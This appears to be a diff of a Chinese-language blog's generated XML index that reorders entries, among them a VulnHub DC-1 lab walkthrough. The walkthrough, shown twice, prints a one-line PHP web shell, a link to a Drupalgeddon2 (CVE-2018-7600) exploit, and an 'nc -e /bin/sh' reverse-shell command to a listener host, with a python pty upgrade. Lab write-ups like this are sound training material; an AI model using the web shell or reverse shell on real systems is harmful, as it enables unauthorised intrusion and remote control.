@@ -219,31 +219,6 @@
     
     
     <entry>
-      <title>VulnHub-DC1</title>
-      <link href="/2022/03/20/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/2022-03-20-VulnHub-DC1/"/>
-      <url>/2022/03/20/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/2022-03-20-VulnHub-DC1/</url>
-      
-        <content type="html"><![CDATA[<h1 id="尋找DC-1靶機"><a href="#尋找DC-1靶機" class="headerlink" title="尋找DC-1靶機"></a>尋找DC-1靶機</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap 10.0.2.4 -A -p-</span><br></pre></td></tr></table></figure><h1 id="發現有port-80-直接瀏覽網頁"><a href="#發現有port-80-直接瀏覽網頁" class="headerlink" title="發現有port 80 -&gt; 直接瀏覽網頁"></a>發現有port 80 -&gt; 直接瀏覽網頁</h1><p><img src="https://i.imgur.com/I1N1wgZ.png"></p><h1 id="使用wappalyzer得知使用Drupal-7"><a href="#使用wappalyzer得知使用Drupal-7" class="headerlink" title="使用wappalyzer得知使用Drupal 7"></a>使用wappalyzer得知使用Drupal 7</h1><p><img src="https://i.imgur.com/B8nHsAB.png"></p><h1 id="搜尋已知Exploit來取得RCE"><a href="#搜尋已知Exploit來取得RCE" class="headerlink" title="搜尋已知Exploit來取得RCE"></a>搜尋已知Exploit來取得RCE</h1><ul><li>CVE-2018-7600<blockquote><p>Exploit:<a href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a></p></blockquote></li></ul><h1 id="ls-發現flag1"><a href="#ls-發現flag1" class="headerlink" title="ls -&gt; 發現flag1"></a>ls -&gt; 發現flag1</h1><p><img src="https://i.imgur.com/4pA9CSv.png"></p><h1 id="發現有shell-php"><a href="#發現有shell-php" class="headerlink" title="發現有shell.php"></a>發現有shell.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>])) &#123; <span class="title function_ invoke__">system</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>] . <span class="string">&#x27; 2&gt;&amp;1 &#x27;</span>);&#125;&gt;</span><br></pre></td></tr></table></figure><h1 id="使用nc-監聽取回reverse-shell-python-pty"><a href="#使用nc-監聽取回reverse-shell-python-pty" class="headerlink" title="使用nc 監聽取回reverse shell(python pty)"></a>使用nc 監聽取回reverse shell(python pty)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.4/shell.php?c=nc%20-e%20%2Fbin%2Fsh%2010.0.2.15%208080</span><br><span class="line">nc -e /bin/sh 10.0.2.15 8080</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> 滲透測試 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Vulnhub </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>M1 Mac 運行x86機器的簡單方法</title>
       <link href="/2022/03/20/%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/2022-03-20-M1-Mac-X86/"/>
       <url>/2022/03/20/%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/2022-03-20-M1-Mac-X86/</url>
@@ -261,6 +236,31 @@
         <tags>
             
             <tag> 架構 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>VulnHub-DC1</title>
+      <link href="/2022/03/20/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/2022-03-20-VulnHub-DC1/"/>
+      <url>/2022/03/20/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/2022-03-20-VulnHub-DC1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="尋找DC-1靶機"><a href="#尋找DC-1靶機" class="headerlink" title="尋找DC-1靶機"></a>尋找DC-1靶機</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap 10.0.2.4 -A -p-</span><br></pre></td></tr></table></figure><h1 id="發現有port-80-直接瀏覽網頁"><a href="#發現有port-80-直接瀏覽網頁" class="headerlink" title="發現有port 80 -&gt; 直接瀏覽網頁"></a>發現有port 80 -&gt; 直接瀏覽網頁</h1><p><img src="https://i.imgur.com/I1N1wgZ.png"></p><h1 id="使用wappalyzer得知使用Drupal-7"><a href="#使用wappalyzer得知使用Drupal-7" class="headerlink" title="使用wappalyzer得知使用Drupal 7"></a>使用wappalyzer得知使用Drupal 7</h1><p><img src="https://i.imgur.com/B8nHsAB.png"></p><h1 id="搜尋已知Exploit來取得RCE"><a href="#搜尋已知Exploit來取得RCE" class="headerlink" title="搜尋已知Exploit來取得RCE"></a>搜尋已知Exploit來取得RCE</h1><ul><li>CVE-2018-7600<blockquote><p>Exploit:<a href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a></p></blockquote></li></ul><h1 id="ls-發現flag1"><a href="#ls-發現flag1" class="headerlink" title="ls -&gt; 發現flag1"></a>ls -&gt; 發現flag1</h1><p><img src="https://i.imgur.com/4pA9CSv.png"></p><h1 id="發現有shell-php"><a href="#發現有shell-php" class="headerlink" title="發現有shell.php"></a>發現有shell.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>])) &#123; <span class="title function_ invoke__">system</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>] . <span class="string">&#x27; 2&gt;&amp;1 &#x27;</span>);&#125;&gt;</span><br></pre></td></tr></table></figure><h1 id="使用nc-監聽取回reverse-shell-python-pty"><a href="#使用nc-監聽取回reverse-shell-python-pty" class="headerlink" title="使用nc 監聽取回reverse shell(python pty)"></a>使用nc 監聽取回reverse shell(python pty)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.4/shell.php?c=nc%20-e%20%2Fbin%2Fsh%2010.0.2.15%208080</span><br><span class="line">nc -e /bin/sh 10.0.2.15 8080</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 滲透測試 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Vulnhub </tag>
             
         </tags>
       
